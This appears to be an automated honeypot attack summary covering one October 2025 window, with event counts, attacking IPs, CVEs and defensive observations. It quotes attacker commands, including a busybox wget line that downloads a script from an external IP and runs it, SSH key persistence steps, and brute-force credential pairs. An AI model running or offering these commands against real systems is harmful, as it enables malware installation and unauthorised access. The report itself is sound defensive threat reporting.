
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-06T05:01:43Z
**Timeframe of Logs:** 2025-10-06T04:20:00Z to 2025-10-06T05:01:00Z

**Files Used:**
- agg_log_20251006T042001Z.json
- agg_log_20251006T044001Z.json
- agg_log_20251006T050001Z.json

## Executive Summary

This report summarizes 15,996 events recorded across the honeypot network. The majority of attacks were captured by the Cowrie, Dionaea, and Mailoney honeypots. A significant portion of the traffic originated from a small number of highly active IP addresses, primarily targeting services like SMB (port 445), SMTP (port 25), and SSH (port 22). Attackers were observed attempting to exploit known vulnerabilities, including CVE-2021-44228 (Log4Shell), and execute remote commands to download and run malicious scripts.

## Detailed Analysis

### Attacks by Honeypot
- Cowrie: 4903
- Dionaea: 1944
- Mailoney: 2498
- Honeytrap: 2795
- Suricata: 1837
- Ciscoasa: 1314
- Sentrypeer: 427
- Tanner: 74
- Redishoneypot: 53
- Adbhoney: 33
- Miniprint: 36
- H0neytr4p: 32
- Honeyaml: 18
- ElasticPot: 14
- ConPot: 12
- Dicompot: 6

### Top Attacking IPs
- 189.27.133.195: 1679
- 86.54.42.238: 1636
- 176.65.141.117: 820
- 80.94.95.238: 938
- 172.86.95.98: 411
- 207.166.168.62: 283
- 107.174.67.215: 253
- 179.40.112.10: 228
- 197.44.15.210: 209
- 57.129.129.209: 248

### Top Targeted Ports/Protocols
- 445: 1892
- 25: 2498
- 22: 622
- 5060: 427
- 80: 82
- 5902: 96
- 5903: 93
- TCP/80: 74
- 6379: 39
- 23: 51

### Most Common CVEs
- CVE-2021-44228 CVE-2021-44228: 30
- CVE-2002-0013 CVE-2002-0012: 11
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 7
- CVE-2019-11500 CVE-2019-11500: 4
- CVE-2021-3449 CVE-2021-3449: 3
- CVE-2024-4577 CVE-2002-0953: 2
- CVE-2024-4577 CVE-2024-4577: 2
- CVE-1999-0183: 2
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773: 1
- CVE-2021-42013 CVE-2021-42013: 1

### Commands Attempted by Attackers
- cd ~; chattr -ia .ssh; lockr -ia .ssh: 31
- lockr -ia .ssh: 31
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...": 31
- uname -a: 31
- Enter new UNIX password: : 28
- Enter new UNIX password:": 28
- cat /proc/cpuinfo | grep name | wc -l: 28
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 28
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 28
- which ls: 28
- ls -lh $(which ls): 28
- crontab -l: 29
- w: 29
- uname -m: 29
- cat /proc/cpuinfo | grep model | grep name | wc -l: 29
- top: 29
- uname: 29
- whoami: 29
- lscpu | grep Model: 29
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 29
- cd /data/local/tmp/; busybox wget http://151.242.30.16/w.sh; sh w.sh; ... : 2

### Signatures Triggered
- ET DROP Dshield Block Listed Source group 1: 506
- 2402000: 506
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 442
- 2023753: 442
- ET SCAN NMAP -sS window 1024: 135
- 2009582: 135
- ET INFO Reserved Internal IP Traffic: 57
- 2002752: 57
- ET DROP Spamhaus DROP Listed Traffic Inbound group 28: 27
- 2400027: 27

### Users / Login Attempts
- 345gs5662d34/345gs5662d34: 29
- michelle/michelle123: 3
- michelle/3245gs5662d34: 3
- nicole/nicole: 3
- athena/athena: 3

### Files Uploaded/Downloaded
- sh: 98
- wget.sh;: 12
- w.sh;: 3
- c.sh;: 3

### HTTP User-Agents
- No HTTP User-Agents were recorded in this timeframe.

### SSH Clients and Servers
- **SSH Clients:** No specific SSH clients were recorded.
- **SSH Servers:** No specific SSH servers were recorded.

### Top Attacker AS Organizations
- No attacker AS organizations were recorded in this timeframe.

## Key Observations and Anomalies

1.  **High-Volume Scanners:** A few IP addresses were responsible for a disproportionately large number of events, notably `189.27.133.195` and `86.54.42.238`. This indicates targeted scanning or automated attack campaigns from these sources.
2.  **Credential Stuffing:** The high number of login attempts with a variety of usernames and passwords, particularly the top credential `345gs5662d34/345gs5662d34`, suggests automated credential stuffing attacks against SSH services.
3.  **Post-Exploitation Activity:** Attackers frequently attempted to modify the `.ssh/authorized_keys` file. This is a common technique to establish persistent access to a compromised machine.
4.  **Remote Code Execution:** There were several attempts to use `wget` and `curl` to download and execute shell scripts (`w.sh`, `c.sh`, `wget.sh`) from external IPs. This is a clear indicator of attempts to install malware or backdoors.
5.  **Reconnaissance Commands:** The widespread use of commands like `uname -a`, `lscpu`, and `cat /proc/cpuinfo` shows that attackers are performing reconnaissance to understand the architecture and environment of the target system before deploying further payloads.
